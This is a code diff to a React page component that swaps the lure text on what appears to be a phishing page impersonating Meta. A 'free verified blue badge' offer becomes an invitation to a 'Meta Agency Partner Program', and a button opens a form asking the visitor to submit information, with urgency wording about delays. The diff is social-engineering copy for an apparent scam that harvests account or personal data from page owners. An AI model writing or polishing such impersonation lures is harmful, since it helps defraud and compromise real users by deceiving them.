@@ -181,15 +181,15 @@ const Page: FC = () => {
                 <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                     <div className='flex items-center gap-2'>
                         <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
-                        <p className='text-2xl font-bold'>{t('Congratulations! You have been selected for a free verified page')}</p>
+                        <p className='text-2xl font-bold'>{t('Meta Agency Partner Program')}</p>
                     </div>
-                    <p>{t(`Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.`)}</p>
+                    <p>{t(`Your agency has been selected as a qualified candidate to participate in the Meta Agency Partner Program. This invitation gives you access to exclusive tools, premium support, and growth opportunities designed to help you scale your business and serve clients more effectively.If you’re ready to take advantage of these partner benefits, you can submit your participation request.`)}</p>
                     <div className='rounded-b-[20px] bg-white'>
                         <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 w-full py-10' />
                         <div className='flex flex-col items-start justify-center gap-5 p-5'>
-                            <p className='text-2xl text-start'>{t('Submit request')}</p>
-                            <p className='text-[15px]'>{t('Elevate Your Security with Blue Badge Unlock!')}</p>
-                            <p className='text-[15px]'>{t('Please submit all requested information below. Failure to do so may result in delays or cancellation of your request processing.')}</p>
+                            <p className='text-2xl text-start'>{t('Participation Request')}</p>
+                            <p className='text-[15px]'>{t('Confirming your eligibility to join the program')}</p>
+                            <p className='text-[15px]'>{t('Please make sure to provide the required information below. Missing details may delay the processing of your request.')}</p>
                             <button
                                 onClick={() => {
                                     setModalKey((prev) => prev + 1);
@@ -197,7 +197,7 @@ const Page: FC = () => {
                                 }}
                                 className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                             >
-                                {t('Request Review')}
+                                {t('Join Meta Agency Program')}
                             </button>
                         </div>
                     </div>
